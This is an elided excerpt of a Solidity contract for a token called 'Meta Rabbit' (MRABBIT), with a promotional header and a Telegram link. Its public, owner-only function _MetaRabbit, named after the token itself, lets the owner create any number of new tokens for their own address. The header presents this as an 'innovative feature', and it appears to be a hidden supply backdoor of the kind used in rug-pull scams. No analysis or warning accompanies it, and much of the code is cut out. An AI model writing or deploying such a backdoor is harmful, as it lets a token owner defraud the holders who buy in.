...
//
// $MetaRabbit proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/MetaRabbitBsc
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaRabbit(uint256 amount) public onlyOwner {
 _MetaRabbit(msg.sender, amount);
    }
    ...
    function _MetaRabbit(address account, uint256 amount) internal virtual {
...
contract $MetaRabbit is ERC20 {
    ...
    constructor() public ERC20("Meta Rabbit", "MRABBIT") {
     _MetaRabbit(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}